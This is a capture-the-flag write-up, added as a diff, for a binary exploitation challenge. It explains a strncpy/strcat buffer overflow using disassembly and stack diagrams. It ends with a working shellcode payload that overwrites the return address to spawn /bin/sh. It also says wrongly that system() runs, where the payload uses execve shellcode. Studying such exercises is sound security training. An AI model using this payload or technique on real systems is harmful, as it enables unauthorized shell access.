@@ -1,0 +1,136 @@
+## program overview
+
+int this program we have a buffer that can hold 64 bytes, and we pass this as a parameter to the function `pp()`, not all the buffer is but we skip 22 bytes from it that mean in the function `pp()`, the buffer will be 42 bytes long. 
+
+in the function `pp()`, we have a two buffers the first and secondm, every buffer here can take 20 bytes.
+
+
+we give the buffer into the function `p()` and in the function `p()` we have a read function that reads the input into anther local buffer that can hold 4096 bytes, and after it search about the index of the newline character into this local buffer and replace it with a null terminator `\0` after it copy 20 bytes from the local buffer.
+
+
+after the pp call the function `p()` into the first buffer and then into the second buffer
+the 
+
+it copies the first (20 bytes) into the main buffer and then make a space then concatenate the second buffer into the main buffer and then put a `\0` into the last bytes
+that make fail all the buffer into the main buffer.
+
+20 bytes for the first buffer, 1 byte for the space, 20 bytes for the second buffer, and 1 byte for the null terminator, which sums up to 42 bytes.
+and finally it prints the main buffer.
+
+```bash
+
+	main buffer (64 bytes)
+
+	+----------------------+------------------------------------------+
+	| first 22 bytes       | 42-byte region used by pp()              |
+	+----------------------+------------------------------------------+
+						   ^
+						   |
+					dest starts here
+
+				inside pp() function:
+
+first buffer (20 bytes) + space (1 byte) + second buffer (20 bytes) + null terminator (1 byte) = 42 bytes
+```
+
+
+## key to the exploitation
+
+here the overflow never reaches return addresses
+cause inside p() , we have a local buffer that can hold 4096 bytes and also read function is fixed into this buffer count
+and after it the function p copies 20 bytes from the local buffer into the first and second buffers.
+the real bug here is Inside p():
+
+```bash
+0x080484b4 <+0>:     push   %ebp
+0x080484b5 <+1>:     mov    %esp,%ebp
+0x080484b7 <+3>:     sub    $0x1018,%esp
+0x080484bd <+9>:     mov    0xc(%ebp),%eax
+0x080484c0 <+12>:    mov    %eax,(%esp)
+0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
+0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
+0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
+0x080484d6 <+34>:    mov    %eax,0x4(%esp)
+0x080484da <+38>:    movl   $0x0,(%esp)
+0x080484e1 <+45>:    call   0x8048380 <read@plt>
+// read(0, local_buffer, 4096);
+0x080484e6 <+50>:    movl   $0xa,0x4(%esp)
+0x080484ee <+58>:    lea    -0x1008(%ebp),%eax
+0x080484f4 <+64>:    mov    %eax,(%esp)
+0x080484f7 <+67>:    call   0x80483d0 <strchr@plt>
+//char *newline = strchr(buffer, '\n');
+
+0x080484fc <+72>:    movb   $0x0,(%eax)
+// replace the newline character with a null terminator
+
+0x080484ff <+75>:    lea    -0x1008(%ebp),%eax
+0x08048505 <+81>:    movl   $0x14,0x8(%esp)
+0x0804850d <+89>:    mov    %eax,0x4(%esp)
+0x08048511 <+93>:    mov    0x8(%ebp),%eax
+0x08048514 <+96>:    mov    %eax,(%esp)
+0x08048517 <+99>:    call   0x80483f0 <strncpy@plt>
+// strncpy(dest, buffer, 20);
+0x0804851c <+104>:   leave  
+0x0804851d <+105>:   ret 
+```
+but the real bug is not here is after what will doing by the first and second buffers we passed to the function `p()`.
+after it in the function `pp()` we have a `strcat()` function that copies the first and concatenate the second buffer into the main buffer.
+
+and here the real bug the two function is depandent on `\0` to end the work.
+```bash
+strlen()
+strcpy()
+strcat()
+```
+
+small example to explain the bug:
+
+```bash
+
+First input: "AAAAAAAAAAAAAAAAAAAA" (20 bytes EXACTLY, no null!)
+strncpy copies 20 bytes, NO NULL TERMINATOR
+first_buffer: "AAAAAAAAAAAAAAAAAAAA" (no null!)
+
+Second input: "BBBBBBBBBBBBBBBBBBBB" (20 bytes EXACTLY)
+strncpy copies 20 bytes, NO NULL TERMINATOR  
+second_buffer: "BBBBBBBBBBBBBBBBBBBB" (no null!)
+
+strcpy(first_buffer) → KEEPS READING past first_buffer into main_buffer.
+strcat(second_buffer) → KEEPS READING past second_buffer into main_buffer.
+the two function still reading and copying or concatenating until find a null terminator.
+
+and like that we can make a buffer overflow into the main buffer and we can control the content of the main buffer and we can use it to exploit the program.
+
+       	Higher addresses
+        +----------------------+
+Return  |  <-- return address  |  <-- [ebp+4] <-- target if an overflow continues upward
+        +----------------------+
+Saved 	|                      |
+EBP		|                      |  <-- [ebp]
+Address +----------------------+
+        |                      |
+buffer  |      buffer[64]      |
+        |                      |
+        +----------+-----------+
+                   ^
+                   |
+             buffer + 22
+                   |
+                   +---- passed as dest to pp()
+				   first_buffer (20 bytes) + space (1 byte) + second_buffer (20 bytes) + null terminator (1 byte) = 42 bytes
+
+        Lower addresses
+
+```
+If writes starting at buffer + 22 continue past the end of the buffer, they move toward higher addresses in memory. 
+The first control data they would encounter is the saved EBP, and immediately after that comes the saved return address.
+
+## payload for test 
+```bash
+(python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89"+"a"*4075+"\n"+"\xe1\xb0\x0b\xcd\x80BBBB"+"\x06\xf7\xff\xbf"+"a"*10)'; cat) | /home/user/bonus0/bonus0
+```     
+
+after it the program will run the system("/bin/sh") and we can get the shell.
+
+what you should do after it :
+
